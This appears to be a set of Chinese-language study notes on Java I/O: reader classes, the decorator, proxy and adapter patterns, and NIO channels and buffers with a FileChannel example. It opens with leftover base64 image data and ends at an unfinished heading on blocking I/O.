vvjiC3ubhp0RBOG/G9soDn7ZiRhzQHQsdx1BEKa+uxxhfUB0HBGIjiIQHbUQBOG7775LTEyE5fwTogPRsYfrQHQgOq4MREcRiI5aCIKQkpLS2Nho74H8y96S889/cqJz5vLf7O4KDh0QHctdB6ID0XFlIDqKQHTUYs2aNbW1tfYexUQBoqOi6PiuLkaYCb+4neQ6EB2IjisD0VEEoqMWgiCsWbPmhx9+sPdAJgRMdE5dvmV3V3DogOhY7jpz5syxuyI4R0B0HBGIjiIQHbUQBOHKlStwHQKiA9EZb9cxbAsODp4WvNLuluAEAdFxRCA6ikB01IKmBrgOwUTneEN78ZediDEHRMeiSNibkJCwYcOG+I274ToQHdcEoqOIIAj23rfqJLCpobGxEa7zf6Jzqb34XCdizCEIgu/qAwhzkVBEfwE3Ozt7w84D8am7p72XMHXuMsSYA6LjiEB0FIHoqAU/NTQ1NaWmpg4MDNjbN+wGE53PLkJ0rBadVQcQirHiF8vp6ekh0SHXsbsrOHRAdBwRiI4iEB21kEwNjY2Nruw6giCcbWw729j26cX2A+c6EWMOQRB8V+1HmI4VhcxymOjEp+7+f+FJdncFhw6IjiMC0VEEoqMW8qnBlV2Hic6RCxAdiM54WA6JDiwHouOyQHQUgeiohcmpoaGhITU1dXBw8MWEYZxFpxyiA9EZF8vp6elZt24dLAei47JAdBSB6KiF0tRQXV2dnp4+Wh3Jzs5eY4rs7OyDpjh79uw1U/zv//6vLWzplTDRKb3QYXdXcOgQBEG3ch/iV7G8QG45P/zwQ3BwsN0VwTkCouOIQHQUgeiohZmp4fTp09nZ2aMShfb29pCQkJqami9/zWeffVZoirS0tARTRERECKZYvHixTUWKE53bdncFhw6IjiWW8/jx43//+9+CINhdEZwjIDqOCERHEUEQno8L/f39Nur522+/tct9JZifGk6dOjVa12lqakpMTOyxDTdv3vzSFGqJ1Jw5c85e/ubs5W8OnevYX3/bdlFwptVGPe/8/LJd7isJkz9epyFg/iJVLGdoaIhmM+07S20Xs0JWW1jtg3W5r6wmr+P7/jqbjt/yECA6DghERxFBVdHx9fWtra2l45s3b/r6+h4/fvz58+fffvutl5cXHcvJz89//vx5U1NTenp60wglJSW+vr6W3NTLyys9Pd3MkKh/YsGCBWYqW8Mrp4bKysrs7OyfR8N///d/p6Wl2ch1bEp2djaJzkE1RMdrurdxVxkdZxyq9ZrunbD1I3KRSVPc6Vge76/avL/+durekyExyal7T1IY/rzTa7q3JTedNMU9JCbZzJCof4rf+QWaqWyl6NCPtLOz076/U3W5e/duwPxFvrHbdSs/tjTMWo5oe9E5eLyuvqnVEt1p+VvXweN15j2p5W9d9U2tr2wF0QEWAtFRRF3R8fLyampqYqfp6ekkK9HR0dHR0XzNpKSk6Ojo9PT09PR0Ly+v2trapqYmX19fXnS8vLzM3IulaiQ35aEBfPvtt0y/fH19k5KSnj9/fvz4ccmQrMSSqeHzzz/Pzc0dleuUlJQUFxdbmAR69uzZwGh48uTJ49HQ19dn4dsYic4Xl9sO1KsgOpOmuKfuPclOQ2KSSVb85ob7zQ3nawZFGPzmhofEJIfEJE+a4m7cVZa696TXdG9edCZNcTdzL5aqkdyUDxrAzs8vM/3ymu4dFGHYX387YetHkiGpJTpdXV1W28VEwRaWI9pMdA4erwtdlUUiUlHbKK8QuipLEulFn97v7pOUtPytS6I1eYdP8SUfrMu9391Hx5JLdBelEaqeCoLoOCIQHUVsJDoLFixISkpKSkry9fUl27cT5x8AACAASURBVEhPT5frDmv1/PlzEh1W2NTUxIvO8ePH0zmio6NZZSXR4XNC5FXPnz+nkeTn53t5eSUlJam4sGXh1PDxxx+XlJSMynWys7Orq6vH7ZFQBUEQVHyzZ87xO7/AoAhDUITBa7o32UZITLJcd1ir/fW3SXRYYerek7zoJGz9iKyIwm9uOKusJDp8Toi8ikQnJCb5/VWbJ01xD4owqLiw5XxvOYODgwHzF/katusSPrY0lr3ackT1RGd52t68w6dY3O/uO3i8zvf9dfe7+wINmy2szx+w4JuT6AQaNpMD3e/uq29qbflbFx3Lpep+d19FbePB43XyoEsQHRcHoqOILUSntrbW19c3Ojq6v7+f+UptbS1L8MhbPR8xG6YySUlJJjM6cq1hJf39/Wx1jBJFSUlJrEMvLy/SI3IdqlZSUqLWa7dwanj58uUYXGfdunX/8z//M25PhfXYQnSMu8q8pnv7zQ0vONPKfMW4q4wleJREhxahKIIiDCYzOnKtYSUFZ1rZ6hglioIiDKzDSVPcSY/IdZgMQXRMMmI52bqEjyyNZXtMWs7w8LCkcxtldFr+1hW6Kislp4QOlDI02neW0sIW5XKo4fK0vfK9OPVNrWQntHpVUdtIFpWSU6J9Z2lFbeP97j75Ahnr1uQI5RkgiI6rAdFRRBXR6e/vX7BgwYIFCzQazYIFC3x9fb28vOigtraWfMXLy4skg7Wi7TKkIM+fP29qauKTLjdv3jS5mYZpTVJSErupr68vuy8laW7evBkdHZ2fn9/U1HTz5k2qf/z4cd5yaAzWv3zC8qnh5cuXH3300ahc56efflqxYkVnZ+f4PBXWo4roFJxp/Z1f4O/8AjUaze/8Ar2me0+a4k4Hxl1l5CuTpriTZLBWtF2GFIREh0+6ZByqNbmZhmlNUISB3dRruje7LyVpMg7V+s0Nf3/V5tS9JzMO1VL9hK0f8ZZDY4DoyLGp5Yg2Fh3aQEOWU1HbWN/UKtEOchdafmKiQ0pU39Qq1x2JnVAGKNCwmTWXNIHoAPNAdBSx0dIVW7GKjo728vIqKSmhHTlMdG7evMmkhDbNkI5QW5ahMXMLvoQOJBkjJlL8qhn5EEsaaTQapS3So2VUU8Pw8DC5zr8t5scff4yNjX348OE4PBXWY6OlK7Zi5Tc3fNIUd8Ofd9KOHCY6GYdqmZTQphnSEWrLMjRmbsGX7B/J4pgUKX7VjHyIJY00Go3SFmmXFR1bW46onuhIPjbV8reulJyS+qZWtndYLhbL0/YyEZGIjnZk841kdYk6WZ62l3pmK1aU5qFTfqkLogPMA9FRRBCEZ+rh5eXV2Nj47Nkzkona2tqKigpakHr27BmJCNVsbGz08vKStI2KikpMTGQHlKdRuoW8H75/NgZ2KTEx8dmzZ319ffxen5KSErVe+2inhuHh4a1bt1ZVVVnuOt3d3TExMU+fPrX1U2E9giDsq7utVkya4p5adHJf3W2v6d4Lo5PX7ipLSP9o0hT3hdHJ++puL4xO9pruTTVTi05OmuIuaes3Nzww3MAOvKZ7/9YvUOkW8n74/tkY2KXAcMO+utt7TrcujE5mEbN+p1qv3TnecgYHBwPmRehist5asdfSWPrhqCxHJNEJirc+Qlduu9/dxzbWtLR1tbR1BRo2tbR1UYWWtq6UnBK+fktbV+jKbXR6v7uPjqkw0LBJGxSfklMiiqLvkhTWqqWtq6LmckXN5Q9ScrVB8bMWrqKbKo2KdSuPlrYuMw3HEM7x1LkaEB1FbCc6fEKFoJUmqklS0tjYuHv37qioKElbOqBWSrcgaMcx3ye7xI+BDqiwoqKCKtTW1qr42scwNQwNDY3WdW7fvr106dJ//vOfNn0qrMd2ovNbv0BeKRZGJ//WL5CJC0lJatHJJSs3+80Nl7SlA2plXnRi1u9kciMXHTYGOqDChPSPqMLaXWUqvnYneMtRy3L+8Y9/vHz50syN1BUddjpr4arlaUXkE2Qt97v76EAbFO+7JKW+sXXWwlUVNZcPHq+rb2wlg6HjiprL97v76htbtUHxrEmgYdMvO4hrLrO7pBd9ykSKgncpiA54JRAdRWwkOo2NjVFRUY0cJSUlfHqmoqIiMTGxsbGRUjh9fX2jFZ179+49e/aMcj90acGCBez4mSyjQ8deXl4kOlFRUV5eXjdu3FDrtY9tahiD6zQ3NycnJ5v5d+1EwEaik1p00m9ueGrRSRYx63fy6ZmE9I8Cww2pRScphbPndOtoRSfns8v76m5T7ocu/dYvkB3vk2V06HjSFHcSHVpT21pSC9Ehxs1yRJuJDu8iB4/XfZCSa/Iqq8MLConOrIWrWEmgYRMpTktbF8lQfeMve5PpgC7Rf3mzgegA80B0FFFddEpKShITE3fv3k3HvOhI1qoIloYxuXQlER3yoaioKHKaGzdu0Hfw0FVJfV9fX3Ip0ikmOrW1tZRbUtFyno1VdERR/Pnnn9PS0qqqqoYspqqqauvWrRPZdVQXnZj1OwPDDUtWbqZjXnQka1VMQSgNY3LpSiI65EN+c8PJabaW1E6a4s4SM5L6XtO9yaVIp5jorN1VRrklFS3H0UVnxHK2vbWiyNJYmj82yxFtLzq+S1JIR8xbRX1jKxnJL9+mI7MTWsDi7WR5WhFL5+QdPkUZIElAdIB5IDqKqCU6tbW1lCOJiooi85CLDr+uxGBpGFrAejaS0blx4wZvLeQ9fP9UyGeJLBSdqKgopjhsGct6rJkafv7555SUlEuXLlnuOocOHfroo48mrOuoJTprd5VRjsRvbjiZh1x0+HUlFiwNQwtY+0YyOltLanlrIe/h+6dCPktkoej4zQ1nisOWsVxZdH6xnOhtby0vsjTiTVjO48ePLbEc0Waik170KS1OaUcyNOabz1q4qqWti9awlNREYictbV3pRZ/6LkmhW9OuHbnopOSUhK7cJg+IDhAhOmZQS3R8fX2joqJoOYmwUHR8fX13794tKaHFqaioKGY/zFQYtM1Zcke+K6WlK36Lj8khjQ0rp4bBwcGUlJQrV65Y7jrbt28/ceLExHQdtUSHPmBFy0n7uOzOK0XHa7r3kpWbJSW0OEUflWJOI8nu0DZnyR35rpSWrvgtPiaH5FKiM2I5mW8tL7Q04nfLLefJkyeW31Rd0fkgJZfWj9hSFCkFrSuZF536xlZan+J3H5sRHd8lKSk5JdQKogPGBkRHEbVEp6+vT1JiXnRu3LhRUlJSUlKi0Wj4OvS1OgtG0Gg0JrcMU2+U+ImKikpPTyfvkUhMenr6jRs3Ghsb2WZkGhUbM7/yZSXWTw0DAwOjdZ1169Z9+eWXE9B1BEH4uO629fHh6VZJCYnOhqKTFCQ67Gp6SW3M+p0x63dqNBq+zsLo5ElT3Glp6bd+gRqNJnlXmfx21NuGopPpJbV+c8MXRievSP9o0hT3DUUnWR0SnfSS2g1FJ2kzMhsVG/OkKe4m+x9DOOJbjl0sR1RPdJanFYmi+Ms3+I0UpuSUsAwN6Y5kszD5Cn1Ki7SD7bxJySlhO5G1QfEfpORSb7ydfJCSS7t26At12MZnXnQkJSxo5xBEx8WB6CgiCMJPtsHT0/PgwYOXRzh48KBOp+MrREVFaTSaqKiou3fvenp66nS6qKiotLS0y5cv37hxg3WSlpYm6TkxMTEqKoqd3r17l7qS9K/T6dLS0mpqanQ6nUajOXjwILX15NDpdJcvX1bl9aoyNTx9+nRUrvP8+fMVK1a0tLRMNNcRBOHjug5bxKQp7jHrczYUnaCIWZ/jNd2br+A3N0yj0fjNDdvxWQN9naDf3LCF0Ukbik6kl9SwThZGJ0l6Dgw3+M0NY6c7PmugriT9e033XhidlLyr1Gu6t0ajiVmfQ20nTXFn4TXde0PRCVVer8O95djLckT1REcbFC9RENomzFegNaz0ok+1XD6GnEaiPqQ7oijSX4TQBsXTR7REUfwgJTfQsIk+b1Xf2MpkhVJKJnfqjE843FMHRIiOGWwnOrt375aU3L17V1LCJEN+iWDGwzcxWZk8hqempsbMVdVRa2r48ccfExMTW1tbhy3j6dOncXFxHR0dE8p1bCc6S1ZulpTs+KxBUsIkQ36JghkP38RkZfIYPpJ3lZq5qno41luOHS1HVFV0eMshm5EH+yxV3uFTZvbiUAQaNvFJl1kLV32QkvtBSq5S20DDJvpMO0QHWAhERxHbiY6roeLU0NfXl5CQ0NnZaaHrdHZ2RkVFmf8utXFGEISP6joQ1ocDveUwy/n9sgIL4634PLnlDAwMjG0AthAd1wwHeuoAA6KjCERHLdSdGnp7ey10nadPn7K3ionjOhAdFxSdgHkRvn/6i70sR4ToQHRcG4iOIhAdtVB9arDEdXjLIR4/fqzK3a0EouOCovPdd98lJCRYmNFR3XJEiA5Ex7WB6CgC0VELW0wNDx8+TEhIuHPnzktTDAwMyC3n559/Vuvu1gDRcUHREUXx8ePHSUlJug9Sf79sj5l4Kz5XdcsRIToQHdcGoqMIREctbDQ13L9/Pz4+vqenx4EsR4TouKroiKI4ODiYmprqu2Tt75fuMRlvxZmwnJ9++sn6W0N0IDquDERHEUEQBu3Bo0ePLKxWXV39ymryOl1dXWMZlhXYaGp4+fLl7du3ExISeNeZ4JYjiqIgCHtrO2wXu09dt7Ba0s7SV1aT18n+tMGm47c8HPEt58WLF1lZWX7hCb9f+qEk3orbJbecZ8+eqXJfQRC8AuPGP2YuWGlhtT+l7BrbLXSLjdYPwPJwxKcOQHQUsYXoFBcX63Q683USExODg4Mt0R2dTpeYmCgplDTU6XTBwcGvbGVTbDc1SFxn4luOaHvRmRNumOU7xxLd8ZzmPSfcYN6TPKd5z/Kd88pWEJ1RsXfvXn1IzLhZjmgb0THuOHitrct8neKK2rrGVkts41pbV3FF7Rg05X53X96hSpOXAmM23u/uC0nI5O+ybEshRMfVgOgoMlrRaWhoSExMTPs19M17ksJjx47JmycmJjY0NAwODup0usjISJP9S8jLy/P09JSUSESK7s6XVFdXe3p60rHk0qNHj8zke8acCrLp1PDy5cv29nbarzPxLUe0mejMCTf8ufAEiYjvO2HyCn8uPCGJRSs3T5riLinxnOYt0ZoF0Ul8SdLO0klT3OlYconuojRC1VNBDv2Wc+zYMf/33v99fN44WI44etEJScgsrqjNO1TJx/3uvmttXZJCk95QXFFLenGtraui5rLJ/iWRXniUpIQvMSNSzIEkKsNHXWNrRc1l3WJjYMxGVpkGXFxRa9xxEKLjIkB0FLE+o1NdXa3RaJQWmI4dOyZRosTExK6uLk9Pz6+//trC+vwBg29OovP111+TA3l6egYHB+t0OjqWSFVDQwP1ZhKNRlNcXDyGn4Otp4bh4eGOjo6IiIiJbzmieqKzLH3vgugkFpOmuM8JN2R/2jBpintaSY2F9fkDFnxzEp20khpyoElT3Gf5zvGc5k3HcqmaNMXd952wOeEGedAliA6jrq4uYF74WzHZtrYcUY2Mzp9SdomiqLTAtGxLoUSJiitqdYuN97v7mGS8sj5/wIKaS+pX1FxmDqQkOhU1l5ljkZ9R5T+l7KLmSnkgiI7zAdFRxHrRCQ4OliwbmUGn0zU0NNDalpkMDXX76NEjyuVQw2PHjsl1Kjg4mP6qA61eRUZGkkWRrERGRnp6ekrWuUh0lEbI7jhaxmFqGB4e/v777ye+5Yg2y+h4TvP+c+GJqPU5dKCUodlb20ELW5TLoYbL0vfK9+LM8p1DdkKrV77vhJFFRa3P2Vvb4ftO2KQp7vIFMtatyRHKM0CuLDqiKF65ckUi6D09Pf/6179Uv5H1olPX2FrX2Gph5WttXSEJmbS2ZT5DQwtbTFZoacnMfh251rCSmQtWsvRSXWMrn3wqrqgVRdG44+D97r66xlbK5QTGbDQpYRAd5wOio4iVonPs2DH6o1HHjh2zcMNNQ0MDbaAhy4mMjAwODpa4BbkLLT8x0SElCg4OluuOZOmKMkBff/01a843cVzREUVxaGjo8ePHE9xyRBuLDm2gIcvxfSdslu8ciXaQu9DyExMdUqJZvnPkuiOxE8oApZXUsOaSJhCdUfHy5csffvjB1pYjWi06y7YU0h8PX7al0MINNyEJmbTthiynouZyXWOrxFGKK2opxcKLDilRXWOrSd1hNWn3T11jqyiK19q6yGzud/fR8Iw7DtLiVEhCpm6xceaClXWNrZItOyEJmWNI6jjBU+eCQHQUsUZ0KONCUjI4OEhLS/I6vGTodLri4mI+CSTfXkPyRLYhEZ3Bkc03kv091MmxY8eoZ7ZiRWkeOmVLXQ4tOqIoDg0N9fX1TWTLEdUTHcnHpjyneUetz5nlO4ftHZaLxbL0vUxEJKKzd2TzjWR1iTpZlr6XemYrVpTmoVN+qQuiM1r4ZKSNLEe0TnQo40JSQoYh9wPJx6autXUZdxzkk0DypSKSJ9IOieh4BcaR/cj395jM6NBB3qFKljEis2EZnWttXemFR6lyRc1lKqxrbL3f3Wf+Q1sQHecAoqOIIAgDY4WWisgbqCQyMlKn07W2trI6dHXLCCQfra2tOp2OKpD68PXJaeiUtIOqNTQ0UM/FxcUajebOnTusFe3CiYyMrKqqGhgY6O3tpZuaHDY/YDnsjqMFUwOPIAhFNe3Wx/qC469NcQ+OSqLwnDbbc9rsLQerPafNpgqe02ZHrcvh63tOm72+4DidvjbFnY6pcMvB6qKa9qh1ORqNJuvoJdbKc9ps3TthunfCEnM+Kappz6tsoZsqjYp1Kw/PabPNNBxDOM1zNTQ09OjRI9tZjkiiMyd2bFHXeL2iuiFkRcb97kdUUlHdcK3tTmB0KqtDV/NKKimutd2hCtfa7lCFa213jNuL+frX2u6ErMig0/vdj+iYCqln4/ZiURR1i9byg2E1+fvSMd3XZM1rbXeWbS70mhMbGJ3KBplXUvkn487R/jSc5qlzKSA6ioxZdMhp5N5A22JIOORXe3t7P//884GBAeZDnp6eTIzu3LkTHBzc29sbGRm5Zs0aSsawY+o5ODh4YGCANWltbV2zZg3leNhdcnNzmUgREpeC6NgadUWHneZVtixL20s+Qdby2hR3Oiiqac86emmW75y8yhbdO2F/CIuZ5TuHDIaOde+EvTbFfZbvnKKadtZky8HqP4TFvDbFXfdOGLvLooRNTKQoeJeC6ExYxiw65DQSpaDy+92PmChIrs4MTiCxYD50v/sREyPdorV1jddnBidUVDcUV9TWNV6/1naHHVPPdY3XyUsk45GIjnF7MZMbuegUV9SS0FCrkBUZdY3XWZ/yziE6zgpER5GxiQ5trFHyBloqooyLklXk5uauWbOmqqrKjHPk5ubygkKi09vby0paW1tJcXQ6HclQcHAweQ8d0CX6L9MXiM44YCPR4V3kD2ExiTmfmLzK6vCCQqKTV9nCSrYcrCbF8Zw2m2Rolu8c8h46oEv0X95sIDoTk7GJTkV1AwmHXGVIYu53P6KMi/wqRXrBkeKK2j8Zd5q8yurwyR4SnZnBCSYrM9Gh+5IeeY1kntixlyyjQ6LDeqacE0THRYDoKDIG0aEUCzuVewP5B+mCklXcuXOHdERpgYmgfcoDAwO5ubkmFYR0SqfTsX4+//xzls7ZsmULEzIzA+aB6KiCrUUn6+gl0hHzVjHLdw4ZyaKETSbthBaweDtZlraXpXOCo5IoAyQJiM7EZAyiwzuESZUJjE5lMqEkOrpFayk9k1dSaeZedY3XqZ/0giOSnA0fM4MT7nc/Iv0qrqilAbCs0rW2O/xd7nc/Mm4vJr/hRYdOiytqJYtiEB0nBqKjyGhFh9Iwr/QGtrQkuZqbm0uLUwMjGRrzt+vt7WUbis34By86Op0uNzf3zp07dGvJaNmQ5N9MSEB0VMFGorMoYRMtThWNZGjMN8+rbPGcNpvWsJTURGInntNmL0rYlHX0Et2adu3IRSdqXc76guPygOjYkdGKDqVh+BKTKsNWfyRX0wuO0OKU10iGxvztZgYnXGu7Q2tYJi2nuKKWEkgV1Q1sYLTUxepYIjqiKOaVVDLFwR4dFwGio4g1m5F5bzB/taqqitaP2FIUbTqmdSUznff29gYHB9P6FL/7WAIvOnfu3KEPdtHn3iE6dkFd0UnM+YTWj9hSFCkFrSuZF51ZvnNofYrffWxGdLKOXopal0OtIDqOhTWbkc2IjuTqn4w7aU8PW4oiyaAtOOZFp67xOnmMyUQL7bbhS5ZtLmQLZ8xs0guO8Kcml65YBdoqBNFxBSA6ithadD7//HONRkPf4McK2RcGDgwMkO7wV4k7d+7Qp7TIYNjOm+LiYv5TXVVVVdQbvwRWVVVFu3a2bNlCnzOXfxBMacCRkZH8NiDLwdTAIwhCYU279bE0ba9Go3ltinvkuhxWGLkuhzI0hTXtpDv8VYqso5foU1rBUUmFNe1s503kupzNB6tZtTU5n1BvVI0V0q6d4Kik16a4e06bzTcprGl/bYq7pITFH8Ji1uR8osprp8BzZTm2Fp1lmwtFUaQkCiukncLs41SSD14x26BNxOQxxRW1tNRl3F5sZrMw6zkwOrWiuiGvpJK8h88GsQ3IbMWKlrqYG1ETpc1AEB1nAqKjiCAIT63j0qVLnp6eZips2bKFHVdVVdE2Yb4CrWHl5uY+ffq0s7PzwIEDtK34wIEDfLXOzk7SHTIn6qSnpycyMlKj0VRVVV2/fp0+bxUcHFxVVcUPLzg42MqX+UowNfAIglBY3a5KBEclseM1Oz6hbcJ8Bd07Ya/9h3tEwqbC6vasI5ciU375op3IlBy+WtaRS38Ii3ntP9w1Gs1r/+FOneSebNG9E6bRaNbs+GRzcXVEwiZa6lqz4xNqtb7g+Gv/4T7Ld45aL2e0gefKcgRB8JxjsCYWrth6v/uRmQq5JSfZ8X8ac2gbDV+B1rDSCo54zjHoFiWv3V5c13i9rvH62u3FfDXdomTSHVEU6ZNTkhsVV9RWVDfw9SuqG0RRvNZ2h692v/vRwhVb124vvt/96H73I92iZM85Blr/YlHXeH20Pwc8dY4IREcR60Xn6dOnnZ2dllSrqqoim5HT09NDB1u2bLl06ZL5fq5fv848htpWVVVVVVUptb1+/fpnn31myQitAVMDj4qiw1sO2Yw8ck+2MCtaX3DcfD+bi6uZx1DbNTs+WbPjE6W2m4url27ZC9GZ+FgvOqQUllT7T2MO2Yw8ZgSvYFa0cMVW8/3Mid7wn8YcuW+ZHIbElqimmX7GHHjqHBGIjiKqiA54CtH5NYIgFFS3I6wPPFeWo4roICA6DgpERxGIjlpgauCB6EB0xh+IDkTHlYHoKALRUQtMDTwQHYjO+APRgei4MhAdRSA6aoGpgQeiA9EZfyA6EB1XBqKjCERHLTA18EB0IDrjD0QHouPKQHQUEQThCVADTA08giDsqbqFsD7wXFmOIAief4hBWB946hwRiI4iEB21wNTAA9GB6Iw/EB2IjisD0VHkvffeE4AazJs3D1MDA8+VWuC5shw8dWqBp84Rgei8mh6gHvb+ZU4g7P2rcCrs/ct0GOz9i3Iq7P3LBJYC0Xk19v6/yamw9y9zAmHvX4VTYe9fpsNg71+UU2HvXyawFIjOq3n06JG9/4dyEh49emTvX+YEAs+VWuC5shw8dWqBp86BgOgAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmB6AAAAADAaYHoAAAAAMBpgegAAAAAwGmZuKLz9ddf23sIAAAAgCty69Ytew9BNSai6Fy+fDkuLm7Hjh32HggAAADgihw9enTJkiU1NTX2HogKTCzRIcURBEEQhK+++srewwEAAABckcePH9N7sRPozkQRHV5xBEF47733Xrx4Ye9BAQAAAC5KQkICe1N2aN2xv+hIFIeIi4uz97gAAAAA12XHjh2St2YH1R17io5JxSFWr179NQAAAADsxPbt202+QTuc7thHdHp7e5UUBwAAAAATnCVLlnz33Xd2UYjRYreMTm9vrzwtxoiJiTkMAAAAADuxdu1apffoTZs2dXV12csfRoud9+go6U5CQoJ9BwYAAAC4Mrt373Z0xSHsvxlZNKU7f/zjH+09KAAAAMB1Wb9+vaMrDjEhRIeQ6I6jLP4BAAAATsaLFy+CgoIcXXGICSQ6BNOdAwcO2HssAAAAgCty/vx5J1AcYsKJDtHb23v48GF7jwIAAABwRWpqapxAcYgJKjoAAAAAANYD0QEAAACA0wLRAQAAAIDTAtEBAAAAgNMC0QEAAADsSVZWloU1Ozs7i4qKysvLLal85swZSdvOzs5RD87xgegAAAAAKtPT06PX60Nl6PV6Sbler9dqtcxdUlJSYmNjBwcH6bSlpeXixYtZWVlUjQgNDZXc7uLFi+yY+Q3dK2UEamvzVz7xcE7RKSoqMlne0tLCHhcLDVqv11+8eLFlBL1eb6FKAwAAcGVMpk9CQ0O1Wi3zGJOQoIiiODg4mJWVlZWVVV5enpKSQoVmmjChoZqsH0m3roZzik5WVpZWqyXDPXPmDJNoEmF6aFpaWiStQkNDmdOQ34iiqNVqU1JSmOjQ6bi/IAAAAA7PxYsXNRrNK/+ZXVRUpNFoOjs7szjIkNipXq+PjY1lTfR6PeuWHUN0COcUHVEUTebo+EdBlC2LUvKQCQ2lhSS5H8tTQQAAAAAPyUpPT88ra1I26MyZM/SuxNat9Hp9CwerD9Exg9OKTlZWiSFgnwAABFdJREFUVkpKSk9PDz0Z9HhpNBp2Smke3oi1Wi17btgxRAcAAID1nDlzRqPRaDQa+Q4b88TGxpK70OJUaGioXJWURIfWMQi2pOVqOK3oSCgvLyeZpSfGpFAriY5k6QqiAwAAYFQMDg7Suwm9iXR2drINEjz0RkPvU1QSGxtL/yAn0RFFke3CKSoqYtuAeKdh71PI6BBOKzr8Lpzy8nISF/JcOk1JSZHsFKNCWv7kRYe29bByiA4AAIBRQWsIIrcsYPJfzkVFRRcvXiSVKSoqon+ck/3Qp7Fo1ynbe8pUCUtXZnA20WlpaQkNDWWfo+vp6YmNjQ0NDaUt7uzXTw+QRqPR6/Xsk3iSPTpYugIAAGA9sbGx7JNW/JsIvdfI5YOSN+Xl5exTV+zf4ZSwkaeClESHf8OC6DgbJMKhoaH0X/ZdBWxLV09Pz8WLF/mkjtLSFf95cogOAAAAyykqKpK8ufBvIuXl5fRPbr4JW6UiaLMp9UBvbbGxsZIvOjEpOuxLd7BHxzmRmOzFixfZh7DoOZMbsRnRwR4dAAAAo4W+/IbfFSp/E0lJSdFoNPzXv0lEh1SJjmndSv6dgSb36EjuhYyOsyERHVrMEkf0OTY2VqPRSL4RR75Hp6Wlhaphjw4AAIBRERsbK//eNZNvIvwmClEmOrTvWNKJ5N/q/FseyVBnZ6dGo5F8BB2i41RIRId/tuhbASVPgGhqjw7lgczLOAAAACDh4sWL8nUD0bI3EZOfuhJFsaWlpaenh/27nScrK0vyaWL5NylDdJwNXnQkdiyOfHWypIlWq2Vbdmj5k3/aWB2IDgAAgLFh/k2ElqViY2OzsrJIcSRLWvSFcK/8gn7657rkj3pCdJyHwcFB2uKu1+sHBwfLy8vZWib9lTW6yn9VoElo/5dkwxdEBwAAwJgx8ybS09NDOyvolH0TCr9PlDZR0HF5ebnJP+xI73RMhoqKitjWi9F+V6Fz4Gyi09nZyTaWk9JKfq/sL8q+siuT1SA6AAAAxoz5NxH6SDk7pW9I0Y6g+TWhoaHyvxt68eJF/a//+DT9zSxq4pp/lNo5RYctVXZ2drLP1Clh8hdPn0vnT9lzZnLZFQAAADAPLTKMuXnLr5FXOHPmjJJF0ZfljvnWDo2ziY4oirwOE52dnZS7oz03PPK/BXHx4sXQ0FD5A2EyPwQAAACAiYwTio6VyDOBDEv+5CwAAAAAJg4QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4LRAdAAAAADgtEB0AAAAAOC0QHQAAAAA4Lf8fyaip3Svb74gAAAAASUVORK5CYII=)

inputStreamReader 可以读取inputStream；

FileReader 继承自inputStreamReader，可以读取File对象

bufferedReader 可以读取inputStreamReader

所以InputstreamReader 与FileReader没有太大区别，知识入参构造不同



dataInputStream 只能读取byte数据，不能读取文件



装饰者模式与代理模式区别：

装饰器模式关注于在一个对象上动态的添加方法，然而代理模式关注于控制对对象的访问

代理模式一般是在内部手动创建一个新的对象实例

装饰者模式一般是通过从外部传入一个对象实例

​        我们可以用另外一句话来总结这些差别：使用代理模式，代理和真实对象之间的的关系通常在编译时就已经确定了，而装饰者能够在运行时递归地被构造。  

适配器模式更多的是关注两个接口之间通过某个适配器进行了转换

​																												

NIO

标准的IO基于字节流和字符流进行操作的，而NIO是基于通道(Channel)和缓冲区(Buffer)进行操作，数据总是从通道读取到缓冲区中，或者从缓冲区写入通道也类似。

**利用Buffer读写数据，通常遵循四个步骤：**

1. 把数据写入buffer；
2. 调用flip；
3. 从Buffer中读取数据；
4. 调用buffer.clear()

一个Buffer有三个属性是必须掌握的，分别是：

- capacity容量
- position位置
- limit限制

![img](https://camo.githubusercontent.com/9339761ac6960d9d923689993786fcb2db6b989e/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d306631383336373136346335366362642e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

- 通道可以读也可以写，流一般来说是单向的（只能读或者写）。
- 通道可以异步读写。
- 通道总是基于缓冲区Buffer来读写。

![img](https://camo.githubusercontent.com/6300d4ff3e04e0124e336ef57321ae2385db417c/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d356463616166396237313036613764392e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

- FileChannel
- DatagramChannel
- SocketChannel
- ServerSocketChannel

```java
RandomAccessFile aFile = new RandomAccessFile("data/nio-data.txt", "rw");
    FileChannel inChannel = aFile.getChannel();

    ByteBuffer buf = ByteBuffer.allocate(48);

    int bytesRead = inChannel.read(buf);
    while (bytesRead != -1) {

      System.out.println("Read " + bytesRead);
      buf.flip();

      while(buf.hasRemaining()){
          System.out.print((char) buf.get());
      }

      buf.clear();
      bytesRead = inChannel.read(buf);
    }
    aFile.close();
```

**阻塞/非阻塞/同步/非同步的关系**

select，epoll

**面向流与面向缓冲**

Java NIO和IO之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。 Java NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。

**阻塞与非阻塞IO**

